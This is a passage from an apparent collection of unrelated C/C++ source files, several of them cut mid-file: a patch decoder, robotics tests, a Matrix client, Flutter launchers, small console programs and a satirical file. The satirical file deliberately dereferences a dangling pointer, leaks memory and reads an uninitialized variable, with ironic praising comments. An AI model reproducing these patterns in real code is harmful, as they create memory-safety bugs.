 uint32_t crc_patch_e = read32(patch.ptr + patch.len - 4);\n\n        uint32_t crc_in_a = crc32(in.ptr, in.len);\n        uint32_t crc_patch_a = crc32(patch.ptr, patch.len - 4);\n\n        if (crc_patch_a != crc_patch_e)\n            error(bps_broken);\n\n        size_t inlen;\n        decodeto(inlen);\n\n        size_t outlen;\n        decodeto(outlen);\n\n        if (inlen != in.len || crc_in_a != crc_in_e) {\n            if (in.len == outlen && crc_in_a == crc_out_e)\n                error = bps_to_output;\n            else\n                error = bps_not_this;\n            if (!accept_wrong_input)\n                goto exit;\n        }\n\n        out->len = outlen;\n        out->ptr = (uint8_t*)mallocImpl(outlen);\n\n        const uint8_t* instart = in.ptr;\n        const uint8_t* inreadat = in.ptr;\n        const uint8_t* inend = in.ptr + in.len;\n\n        uint8_t* outstart = out->ptr;\n        uint8_t* outreadat = out->ptr;\n        uint8_t* outat = out->ptr;\n        uint8_t* outend = out->ptr + out->len;\n\n        size_t metadatalen;\n        decodeto(metadatalen);\n\n        if (metadata && metadatalen) {\n            metadata->len = metadatalen;\n            metadata->ptr = (uint8_t*)mallocImpl(metadatalen + 1);\n            for (size_t i = 0; i < metadatalen; i++)\n                metadata->ptr[i] = read8();\n            metadata->ptr[metadatalen] = '\\0'; // just to be on the safe side - that metadata is assumed to be text, might as well terminate it\n        } else {\n            for (size_t i = 0; i < metadatalen; i++)\n                (void)read8();\n        }\n\n        while (patchat < patchend) {\n            size_t thisinstr;\n            decodeto(thisinstr);\n            size_t length = (thisinstr >> 2) + 1;\n            int action = (thisinstr & 3);\n            if (outat + length > outend)\n                error(bps_broken);\n\n     ",
    "// Copyright (c) 2020, Samsung Research America\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License. Reserved.\n\n#include <memory>\n#include <string>\n#include <vector>\n\n#include \"gtest/gtest.h\"\n#include \"rclcpp/rclcpp.hpp\"\n#include \"nav2_costmap_2d/costmap_2d.hpp\"\n#include \"nav2_costmap_2d/costmap_subscriber.hpp\"\n#include \"nav2_util/lifecycle_node.hpp\"\n#include \"nav2_smac_planner/node_2d.hpp\"\n#include \"nav2_smac_planner/collision_checker.hpp\"\n\nclass RclCppFixture\n{\npublic:\n  RclCppFixture() {rclcpp::init(0, nullptr);}\n  ~RclCppFixture() {rclcpp::shutdown();}\n};\nRclCppFixture g_rclcppfixture;\n\nTEST(Node2DTest, test_node_2d)\n{\n  auto node = std::make_shared<rclcpp_lifecycle::LifecycleNode>(\"test\");\n  nav2_costmap_2d::Costmap2D costmapA(10, 10, 0.05, 0.0, 0.0, 0);\n  std::unique_ptr<nav2_smac_planner::GridCollisionChecker> checker =\n    std::make_unique<nav2_smac_planner::GridCollisionChecker>(&costmapA, 72, node);\n  checker->setFootprint(nav2_costmap_2d::Footprint(), true, 0.0);\n\n  // test construction\n  unsigned char cost = static_cast<unsigned char>(1);\n  nav2_smac_planner::Node2D testA(1);\n  testA.setCost(cost);\n  nav2_smac_planner::Node2D testB(1);\n  testB.setCost(cost);\n  EXPECT_EQ(testA.getCost(), 1.0f);\n  nav2_smac_planner::SearchInfo info;\n  info.cost_penalty = 1.0;\n  unsigned int size = 10;\n  nav2_smac_planner::Node2D::initMotionModel(\n    nav2_smac_planner::MotionModel::TWOD, size, size, size, info);\n\n  // test reset\n  testA.reset();\n  EXPECT_TRUE(std::isnan(testA.getCost()));\n\n  // check collision checking\n  EXPECT_EQ(testA.isNodeValid(false, checker.get()), true);\n  testA.setCost(255);\n  EXPECT_EQ(testA.isNodeValid(true, checker.get()), true);\n  testA.setCost(10);\n\n  // check traversal cost computation\n  EXPECT_NEAR(testB.getTraversalCost(&testA), 1.03f, 0.1f);\n\n  // check heuristic cost computation\n  nav2_smac_planner::Node2D::Coordinates A(0.0, 0.0);\n  nav2_smac_planner::Node2D::Coordinates B(10.0, 5.0);\n  EXPECT_NEAR(testB.getHeuristicCost(A, B, nullptr), 11.18, 0.02);\n\n  // check operator== works on index\n  unsigned char costC = '2';\n  nav2_smac_planner::Node2D testC(1);\n  testC.setCost(costC);\n  EXPECT_TRUE(testA == testC);\n\n  // check accumulated costs are set\n  testC.setAccumulatedCost(100);\n  EXPECT_EQ(testC.getAccumulatedCost(), 100.0f);\n\n  // check visiting state\n  EXPECT_EQ(testC.wasVisited(), false);\n  testC.queued();\n  EXPECT_EQ(testC.isQueued(), true);\n  testC.visited();\n  EXPECT_EQ(testC.wasVisited(), true);\n  EXPECT_EQ(testC.isQueued(), false);\n\n  // check index\n  EXPECT_EQ(testC.getIndex(), 1u);\n\n  // check static index functions\n  EXPECT_EQ(nav2_smac_planner::Node2D::getIndex(1u, 1u, 10u), 11u);\n  EXPECT_EQ(nav2_smac_planner::Node2D::getIndex(6u, 43u, 10u), 436u);\n  EXPECT_EQ(nav2_smac_planner::Node2D::getCoords(436u, 10u, 1u).x, 6u);\n  EXPECT_EQ(nav2_smac_planner::Node2D::getCoords(436u, 10u, 1u).y, 43u);\n  EXPECT_THROW(nav2_smac_planner::Node2D::getCoords(436u, 10u, 10u), std::runtime_error);\n}\n\nTEST(Node2DTest, test_node_2d_neighbors)\n{\n  auto lnode = std::make_shared<rclcpp_lifecycle::LifecycleNode>(\"test\");\n  nav2_smac_planner::SearchInfo info;\n  unsigned int size_x = 10u;\n  unsigned int size_y = 10u;\n  unsigned int quant = 0u;\n  // test neighborhood computation\n  size_x = 100u;\n  nav2_smac_planner::Node2D::initMotionModel(\n    nav2_smac_planner::MotionModel::TWOD, size_x, size_y,\n    quant, info);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets.size(), 8u);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[0], -1);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[1], 1);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[2], -100);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[3], 100);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[4], -101);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[5], -99);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[6], 99);\n  EXPECT_EQ(nav2_smac_planner::Node2D::_neighbors_grid_offsets[7], 101);\n\n  nav2_costmap_2d::Costmap2D costmapA(10, 10, 0.05, 0.0, 0.0, 0);\n  std::unique_ptr<nav2_smac_planner::GridCollisionChecker> checker =\n    std::make_unique<nav2_smac_planner::GridCollisionChecker>(&costmapA, 72, lnode);\n  unsigned char cost = static_cast<unsigned int>(1);\n  nav2_smac_planner::Node2D * node = new nav2_smac_planner::Node2D(1);\n  node->setCost(cost);\n  std::function<bool(const unsigned int &, nav2_smac_planner::Node2D * &)> neig",
    "#include \"../../include/FSM/FSM.h\"\n#include <iostream>\n\nFSM::FSM(ControlFSMData *data)\n    :_data(data)\n{\n\n    _stateList.invalid = nullptr;\n    _stateList.passive = new FSMState_Passive(_data);\n    _stateList.walking = new FSMState_Walking(_data);\n\n    initialize();\n}\n\nFSM::~FSM(){\n    _stateList.deletePtr();\n}\n\nvoid FSM::initialize()\n{\n    count = 0;\n    _currentState = _stateList.walking;\n    _currentState -> enter();\n    _nextState = _currentState;\n    _mode = FSMMode::NORMAL;\n}\n\nvoid FSM::run()\n{\n    _data->sendRecv();\n\n    if(!checkSafty())\n    {\n        _data->_interface->setPassive();\n    }\n\n    if(_mode == FSMMode::NORMAL)\n    {\n        _currentState->run();\n        _nextStateName = _currentState->checkTransition();\n        if(_nextStateName != _currentState->_stateName)\n        {\n            _mode = FSMMode::CHANGE;\n            _nextState = getNextState(_nextStateName);\n        }\n    }\n    else if(_mode == FSMMode::CHANGE)\n    {\n        // std::cout << \"change state\" << std::endl;\n        _currentState->exit();\n        _currentState = _nextState;\n        _currentState->enter();\n        _mode = FSMMode::NORMAL;\n        _currentState->run();       \n    }\n\n    count++;\n}\n\nFSMState* FSM::getNextState(FSMStateName stateName)\n{\n    switch(stateName)\n    {\n        case FSMStateName::INVALID:\n            return _stateList.invalid;\n        break;\n        case FSMStateName::PASSIVE:\n            return _stateList.passive;\n        break;\n        case FSMStateName::WALKING:\n            return _stateList.walking;\n        break;\n        default:\n            return _stateList.invalid;\n        break;\n    }\n}\n\nbool FSM::checkSafty()\n{\n    if(_data->_stateEstimator->getResult().rBody(2,2) < 0.5)\n    {\n        return false;\n    }\n    else\n    {\n        return true;\n    }\n}",
    "#include \"MatrixClient.h\"\n\nMatrixClient::MatrixClient(std::string host_name, std::string port, boost::asio::io_context& io_context)\n    : host(std::move(host_name)), port_(std::move(port)), ctx_(boost::asio::ssl::context::tlsv12_client),\n        stream_(io_context, ctx_), resolver(io_context), write_timer_(stream_.get_executor()) {\n    ctx_.set_verify_mode(boost::asio::ssl::verify_peer);\n    ctx_.set_default_verify_paths();\n}\n\n/**\n * Establishes a connection to\n * our the matrix server\n * @return\n */\nboost::asio::awaitable<void> MatrixClient::connect() {\n    try {\n        auto const results = co_await resolver.async_resolve(host, port_, boost::asio::use_awaitable);\n\n        co_await boost::beast::get_lowest_layer(stream_).async_connect(results, boost::asio::use_awaitable);\n\n        co_await stream_.async_handshake(boost::asio::ssl::stream_base::client, boost::asio::use_awaitable);\n    }\n    catch (const std::exception& ec) {\n        // do something with this besides just printing it out\n        std::cerr << ec.what() << std::endl;\n    }\n}\n\nvoid MatrixClient::stop() {\n    try {\n        // shutdown the ssl stream gracefully\n        stream_.shutdown();\n        // close the underlying socket\n        boost::beast::get_lowest_layer(stream_).close();\n    } catch (const std::exception& ec) {\n        throw ec;\n    }\n}\n\n/**\n * Logins to the matrix server using\n * username and password also fetches our login token\n * @param username\n * @param password\n * @return\n */\nboost::asio::awaitable<void> MatrixClient::password_login(const std::string &username, const std::string &password) {\n\n    namespace http = boost::beast::http;\n    http::request<http::string_body> req {http::verb::post,  \"/_matrix/client/r0/login\", 11};\n    req.set(http::field::host, host);\n    req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);\n    req.set(http::field::content_type, \"application/json\");\n    req.body() = generate_password_login_string(username, password);\n    req.prepare_payload();\n\n    try {\n        // send the http request for login\n        co_await http::async_write(stream_, req, boost::asio::use_awaitable);\n\n        // Declare a container to hold the response\n        boost::beast::flat_buffer buffer;\n        http::response<http::dynamic_body> res;\n\n        // receive the read response\n        co_await http::async_read(stream_, buffer, res, boost::asio::use_awaitable);\n\n        if (res.result() != http::status::ok) {\n            std::cerr << \"HTTP request failed: \" << res.result_int() << \" \" << res.reason() << std::endl;\n            // implement a stop method\n        }\n\n        const std::string response_body = boost::beast::buffers_to_string(res.body().data());\n\n        token = parse_login_response(response_body);\n\n    }\n    catch (const std::exception& ec) {\n       std::cerr << ec.what() << std::endl;\n    }\n}\n\n/**\n *  Login to matrix server via\n *  token\n * @param login_token wanted to make it so\n * you could supply youre own token\n * @return\n */\nboost::asio::awaitable<void> MatrixClient::token_login(const std::string& login_token) {\n\n    namespace http = boost::beast::http;\n    http::request<http::string_body> req {http::verb::post,  \"/_matrix/client/r0/login\", 11};\n\n    req.set(http::field::host, host);\n    req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);\n    req.set(http::field::content_type, \"application/json\");\n    req.body() = generate_username_login_string(login_token);\n    req.prepare_payload();\n\n    try {\n        co_await http::async_write(stream_, req, boost::asio::use_awaitable);\n\n        boost::beast::flat_buffer buffer;\n        http::response<http::dynamic_body> res;\n\n        co_await http::async_read(stream_, buffer, res, boost::asio::use_awaitable);\n\n        if (res.result() != http::status::ok) {\n            std::cerr << \"HTTP request failed: \" << res.result_int() << \" \" << res.reason() << std::endl;\n        }\n\n        const std::string response_body = boost::beast::buffers_to_string(res.body().data());\n    }\n    catch (const std::exception& ec) {\n        std::cerr << ec.what() << std::endl;\n    }\n}\n\n/**\n * Overloaded method\n * this will use the token we grabbed during\n * the login\n * @return\n */\nboost::asio::awaitable<void> MatrixClient::token_login() {\n    namespace http = boost::beast::http;\n    http::request<http::string_body> req {http::verb::post,  \"/_matrix/client/r0/login\", 11};\n\n    req.set(http::field::host, host);\n    req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);\n    req.set(http::field::content_type, \"application/json\");\n    req.body() = generate_username_login_string(token);\n    req.prepare_payload();\n\n    try {\n        co_await http::async_write(stream_, req, boost::asio::use_awaitable);\n\n        boost::beast::flat_buffer buffer;\n        http::response<http::dynamic_body> res;\n\n        co_await http::async_read(stream_, buffer, res, boost::asio::use_awaitable);\n\n        if (res.result() != http::status::ok) {\n            std::cerr << \"HTTP request failed: \" << res.re",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"favorite_places\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\r\n//CURRENCY CONVERSION PROGRAM BY GOWTHAM DAVULURI\r\n#include <iostream>\r\nusing namespace std;\r\n\r\n\r\n\r\nint newop;\r\n\r\n\r\n\r\n// Function for operations in Currency Converter\r\n\r\nvoid currency_converter(){\r\n\r\n    cout <<\"Available options for currency conversion are:\" <<endl;\r\n\r\n    cout <<\"1. Convert to US Dollar\\n\";\r\n\r\n    cout <<\"2. Convert to Euro\\n\";\r\n\r\n    cout <<\"3. Convert to Japanese Yen\\n\";\r\n    \t\r\n\tcout<<\"4. Convert to Australian Dollar\\n\";\r\n\r\n\tcout<<\"5. Convert to English Pound\\n\";\r\n\t\r\n\tcout<<\"6. Convert to Malaysian Ringgit \\n\";\r\n\r\n    cout << \"\\n\";\r\n\r\n    int option;\r\n\r\n    cout << \"Your option: \";\r\n\r\n    cin >> option;\r\n\r\n    float inr;\r\n\r\n\r\n\r\n    switch(option)\r\n\r\n    {\r\n\r\n        // Case for Converting INR to USD(US Dollar)\r\n\r\n        case 1:\r\n\r\n            cout << \"\\nEnter the INR amount to convert into USD: \";\r\n\r\n            cin >> inr;\r\n\r\n            inr *= 0.012;\r\n\r\n            cout << \"The converted USD amount: \" << inr << endl;\r\n\r\n            cout << \"Do you want to convert to a new currency?\\nPress 1 to 'proceed' and 2 to 'exit' from here\\n\" << endl;\r\n\r\n            cout << \"Your option: \";\r\n\r\n            cin >> newop;\r\n\r\n            if (newop == 1){\r\n\r\n                currency_converter();\r\n\r\n            }\r\n\r\n        break;\r\n\r\n       \r\n\r\n        // Case for Converting INR to EUR(Euro)\r\n\r\n        case 2:\r\n\r\n            cout << \"\\nEnter the INR amount to convert into EUR: \";\r\n\r\n            cin >> inr;\r\n\r\n            inr *= 0.011;\r\n\r\n            cout << \"The converted EUR amount: \" << inr << endl;\r\n\r\n            cout << \"Do you want to convert to a new currency?\\nPress 1 to 'proceed' and 2 to 'exit' from here\\n\" << endl;\r\n\r\n            cout << \"Your option: \";\r\n\r\n            cin >> newop;\r\n\r\n            if (newop == 1){\r\n\r\n                currency_converter();\r\n\r\n            }\r\n\r\n        break;\r\n\r\n       \r\n\r\n        // Case for Converting INR to JPY(Japanese Yen)\r\n\r\n        case 3:\r\n\r\n            cout << \"\\nEnter the INR amount to convert into JPY: \";\r\n\r\n            cin >> inr;\r\n\r\n            inr *= 1.75;\r\n\r\n            cout << \"The converted JPY amount: \" << inr << endl;\r\n\r\n            cout << \"Do you want to convert to a new currency??\\nPress 1 to 'proceed' and 2 to 'exit' from here\\n\" << endl;\r\n\r\n            cout << \"Your option: \";\r\n\r\n            cin >> newop;\r\n\r\n            if (newop== 1){\r\n\r\n                currency_converter();\r\n\r\n            }\r\n\r\n        break;\r\n        \r\n        // Case for converting Rupee to Australian Dollar\r\n        case 4:\r\n\r\n            cout << \"\\nEnter the INR amount to convert into Australian Dollar: \";\r\n\r\n            cin >> inr;\r\n\r\n            inr *= 0.018;\r\n\r\n            cout << \"The converted Australian Dollar amount: \" << inr << endl;\r\n\r\n            cout << \"Do you want to convert to a new currency?\\nPress 1 to 'proceed' and 2 to 'exit' from here\\n\" << endl;\r\n\r\n            cout << \"Your option: \";\r\n\r\n            cin >> newop;\r\n\r\n            if (newop == 1){\r\n\r\n                currency_converter();\r\n\r\n            }\r\n\r\n    \tbreak;\r\n           // Case for converting Rupee to English Pound\r\n        case 5:\r\n\r\n            cout << \"\\nEnter the INR amount to convert into English Pound: \";\r\n\r\n            cin >> inr;\r\n\r\n            inr *= 0.0093;\r\n\r\n            cout << \"The converted English Pound amount: \" << inr << endl;\r\n\r\n            cout << \"Do you want to convert to a new currency?\\nPress 1 to 'proceed' and 2 to 'exit' from here\\n\" << endl;\r\n\r\n            cout << \"Your option: \";\r\n\r\n            cin >> newop;\r\n\r\n            if (newop == 1){\r\n\r\n                currency_converter();\r\n\r\n            }\r\n\r\n    \tbreak;\r\n    \t // Case for converting Rupee to Malaysian Ringgit\r\n        case 6:\r\n\r\n            cout << \"\\nEnter the INR amount to convert into Malaysian Ringgit: \";\r\n\r\n            cin >> inr;\r\n\r\n            inr *= 0.05369;\r\n\r\n            cout << \"The converted Ringgit amount: \" << inr << endl;\r\n\r\n            cout << \"Do you want to convert to a new currency?\\nPress 1 to 'proceed' and 2 to 'exit' from here\\n\" << endl;\r\n\r\n            cout << \"Your option: \";\r\n\r\n            cin >> newop;\r\n\r\n            if (newop == 1){\r\n\r\n                currency_converter();\r\n\r\n            }\r\n\r\n    \tbreak;\r\n\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n    currency_converter();\r\n\r\n    cout << \"Thank you!\";\r\n\r\n    return 0;\r\n\r\n}\r\n",
    "/*\n***************************************************************************\n*\n* Author: Teunis van Beelen\n*\n* Copyright (C) 2015 - 2023 Teunis van Beelen\n*\n* Email: teuniz@protonmail.com\n*\n***************************************************************************\n*\n* This program is free software: you can redistribute it and/or modify\n* it under the terms of the GNU General Public License as published by\n* the Free Software Foundation, either version 3 of the License, or\n* (at your option) any later version.\n*\n* This program is distributed in the hope that it will be useful,\n* but WITHOUT ANY WARRANTY; without even the implied warranty of\n* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n* GNU General Public License for more details.\n*\n* You should have received a copy of the GNU General Public License\n* along with this program.  If not, see <http://www.gnu.org/licenses/>.\n*\n***************************************************************************\n*/\n\n\n#include \"save_data_thread.h\"\n\n\n\n\n\nsave_data_thread::save_data_thread(int job_s)\n{\n  job = job_s;\n\n  hdl = -1;\n\n  err_num = -1;\n\n  err_str[0] = 0;\n\n  n_bytes_rcvd = -1;\n\n  devparms = NULL;\n\n  datrecs = 0;\n\n  smps_per_record = 0;\n}\n\n\nint save_data_thread::get_error_num(void)\n{\n  return err_num;\n}\n\n\nvoid save_data_thread::get_error_str(char *dest, int sz)\n{\n  strlcpy(dest, err_str, sz);\n}\n\n\nint save_data_thread::get_num_bytes_rcvd(void)\n{\n  return n_bytes_rcvd;\n}\n\n\nvoid save_data_thread::run()\n{\n  err_str[0] = 0;\n\n  switch(job)\n  {\n    case 0: read_data();\n            break;\n    case 1: save_memory_edf_file();\n            break;\n    default: err_num = -4;\n            break;\n  }\n}\n\n\nvoid save_data_thread::read_data(void)\n{\n  msleep(100);\n\n  n_bytes_rcvd = tmc_read();\n\n  err_num = 0;\n}\n\n\nvoid save_data_thread::init_save_memory_edf_file(struct device_settings *devp, int hdl_s,\n                                                 int records, int smpls,\n                                                 short **wav)\n{\n  datrecs = records;\n\n  devparms = devp;\n\n  smps_per_record = smpls;\n\n  wavbuf = wav;\n\n  hdl = hdl_s;\n}\n\n\nvoid save_data_thread::save_memory_edf_file(void)\n{\n  int i, chn;\n\n  if(devparms == NULL)\n  {\n    strlcpy(err_str, \"save_memory_edf_file(): Invalid devparms pointer.\", 4096);\n\n    err_num = 1;\n\n    msleep(200);\n\n    return;\n  }\n\n  if(hdl < 0)\n  {\n    strlcpy(err_str, \"save_memory_edf_file(): Invalid handel.\", 4096);\n\n    err_num = 2;\n\n    msleep(200);\n\n    return;\n  }\n\n  msleep(100);\n\n  for(i=0; i<datrecs; i++)\n  {\n    for(chn=0; chn<MAX_CHNS; chn++)\n    {\n      if(!devparms->chandisplay[chn])\n      {\n        continue;\n      }\n\n      if(edfwrite_digital_short_samples(hdl, wavbuf[chn] + (i * smps_per_record)))\n      {\n        strlcpy(err_str, \"A file write error occurred.\", 4096);\n\n        err_num = 3;\n\n        return;\n      }\n    }\n  }\n\n  err_num = 0;\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <map>\n#include <memory>\n#include <stdexcept>\n\n// Struct with a copy constructor to demonstrate deep copy issues\n// Score: Memory Management: 6/10\n// Positives: Provides explicit control over memory allocation and deallocation\nstruct DeepCopyExample\n{\n    int *data;\n    DeepCopyExample(int value) : data(new int(value)) {}\n    ~DeepCopyExample() { delete data; }\n\n    // Copy constructor\n    DeepCopyExample(const DeepCopyExample &other)\n    {\n        data = new int(*other.data);\n    }\n\n    // Move constructor\n    DeepCopyExample(DeepCopyExample &&other) noexcept : data(other.data)\n    {\n        other.data = nullptr;\n    }\n\n    // Copy assignment\n    DeepCopyExample &operator=(const DeepCopyExample &other)\n    {\n        if (this == &other)\n            return *this; // self-assignment check\n        delete data;\n        data = new int(*other.data);\n        return *this;\n    }\n\n    // Move assignment\n    DeepCopyExample &operator=(DeepCopyExample &&other) noexcept\n    {\n        if (this == &other)\n            return *this; // self-assignment check\n        delete data;\n        data = other.data;\n        other.data = nullptr;\n        return *this;\n    }\n};\n\n// Multiple inheritance ambiguity example\n// Score: OOP Design: 6/10\n// Positives: Supports multiple inheritance for complex hierarchy designs\nclass Base1\n{\npublic:\n    virtual void method()\n    {\n        std::cout << \"Base1 method\" << std::endl;\n    }\n};\n\nclass Base2\n{\npublic:\n    virtual void method()\n    {\n        std::cout << \"Base2 method\" << std::endl;\n    }\n};\n\nclass Derived : public Base1, public Base2\n{\npublic:\n    void method() override\n    {\n        Base1::method(); // Explicitly specifying which base class method to call\n        Base2::method();\n    }\n};\n\n// Static initialization order fiasco\n// Score: Language Complexity: 5/10\n// Positives: Supports advanced static initialization with fine-grained control\nclass StaticInit\n{\npublic:\n    StaticInit()\n    {\n        std::cout << \"StaticInit constructor\" << std::endl;\n        if (!initialized)\n        {\n            std::cout << \"Static member not yet initialized\" << std::endl;\n        }\n    }\n\n    static bool initialized;\n};\n\nbool StaticInit::initialized = []()\n{\n    std::cout << \"StaticInit static initializer\" << std::endl;\n    return true;\n}();\n\nvoid CppIsAwesome()\n{\n    // Amazing manual memory management, so much fun!\n    // Score: Memory Management: 6/10\n    // Positives: Enables precise control over memory allocation and lifecycle\n    std::map<std::string, std::unique_ptr<void>> data;\n    data[\"string\"] = std::make_unique<std::string>(\"value\");\n    data[\"int\"] = std::make_unique<int>(42);\n    data[\"bool\"] = std::make_unique<bool>(true);\n    data[\"array\"] = std::make_unique<std::vector<int>>(std::initializer_list<int>{1, 2, 3});\n\n    // Dangling pointers, because who needs safety?\n    // Score: Memory Safety: 5/10\n    // Positives: Encourages disciplined management of pointers\n    int *dangling_ptr = nullptr;\n    {\n        int temp = 42;\n        dangling_ptr = &temp;\n    }\n    // temp is out of scope, but let's still use dangling_ptr!\n    std::cout << \"Dangling pointer value: \" << *dangling_ptr << std::endl; // Undefined behavior!\n\n    // Memory leak, because who needs RAII?\n    // Score: Memory Management: 6/10\n    // Positives: Allows developers to utilize RAII to prevent memory leaks\n    int *leaked_memory = new int[100];\n    // Oops, forgot to delete it!\n\n    // Uninitialized variable, because initial values are for the weak\n    // Score: Type Safety: 5/10\n    // Positives: Strong typing and compile-time checks mitigate this issue\n    int uninitialized_var;\n    std::cout << \"Uninitialized variable value: \" << uninitialized_var << std::endl; // Undefined behavior!\n\n    // Deep copy issues\n    // Score: Memory Management: 6/10\n    // Positives: Supports deep copy and move semantics for efficient data management\n    DeepCopyExample example1(5);\n    DeepCopyExample example2 = example1; // Deep copy\n    std::cout << \"Deep copy value: \" << *example2.data << std::endl;\n\n    // Move semantics issues\n    // Score: Memory Management: 7/10\n    // Positives: Offers move semantics to optimize resource usage\n    DeepCopyExample example3 = std::move(example1); // Move\n    std::cout << \"Moved value: \" << *example3.data << std::endl;\n    if (example1.data)\n    {\n        std::cout << \"Original after move (should be nullptr): \" << *example1.data << std::endl;\n    }\n    else\n    {\n        std::cout << \"Original after move is nullptr\" << std::endl;\n    }\n\n    // Exception handling, because who needs structured error management?\n    // Score: Error Handling: 7/10\n    // Positives: Provides robust exception handling for runtime errors\n    try\n    {\n        if (data.find(\"nonexistent\") == data.end())\n        {\n            throw std::runtime_error(\"key not found\");\n        }\n\n        for (const auto &pair : data)\n        {\n            const std::string &key",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nbool validate_credit_card(const string& credit_card) {\n    for (size_t i = 0; i < credit_card.length(); ++i) {\n        if (!isdigit(credit_card[i])) {\n            return false;\n        }\n    }\n    return true;\n}\n\nbool validate_credit_card_number(const string& credit_card, const string valid_credit_cards[], const int num_valid_credit_cards) {\n    for (int i = 0; i < num_valid_credit_cards; ++i) {\n        if (credit_card == valid_credit_cards[i]) {\n            return true;\n        }\n    }\n    return false;\n}\n\nstring enter_credit_card() {\n    string credit_card;\n    do {\n        cout << \"Enter 10-digit credit_card_number:\\n \";\n        cin >> credit_card;\n        if (credit_card.length() != 10 || !validate_credit_card(credit_card)) {\n            cout << \"SORRY Please enter 10-digit credit_card_number.\" << endl;\n        }\n    } while (credit_card.length() != 10 || !validate_credit_card(credit_card));\n    return credit_card;\n}\n\nint main() {\n    const int num_credit_cards = 20;\n    string valid_credit_cards[num_credit_cards] = {\n        \"2001200111\", \"2002200222\", \"2003200333\", \"2004200444\", \"2005200555\",\n        \"2006200666\", \"2007200777\", \"2008200888\", \"2009200999\", \"2010201010\",\n        \"2011201111\", \"2012201212\", \"2013201313\", \"2014201414\", \"2015201515\",\n        \"2016201616\", \"2017201717\", \"2018201818\", \"2019201919\", \"2020202020\"\n    };\n\n    int option;\n\n    while (true) {\n        cout << \"----------INFORMATION IN CREDIT_CARD_NUMBERS----------\" << endl;\n        cout << \"          1: Enter a credit_card_number\" << endl;\n        cout << \"          2: Continue enter another credit_card_number\" << endl;\n        cout << \"          3: Exit\" << endl;\n\n        cout << \"Enter your choice (1 & 2 & 3): \\n\";\n        cin >> option;\n\n        switch (option) {\n            case 1:\n                {\n                    string credit_card = enter_credit_card();\n                    if (validate_credit_card_number(credit_card, valid_credit_cards, num_credit_cards)) {\n                        cout << \"Valid_credit_card_number!\" << endl;\n                    } else {\n                        cout << \"Invalid credit_card_number!\" << endl;\n                    }\n                }\n                break;\n            case 2:\n                {\n                    string credit_card = enter_credit_card();\n                    if (validate_credit_card_number(credit_card, valid_credit_cards, num_credit_cards)) {\n                        cout << \"Valid credit_card_number!\" << endl;\n                    } else {\n                        cout << \"Invalid credit_card_number!\" << endl;\n                    }\n                }\n                break;\n            case 3:\n                cout << \"Exits the program.\" << 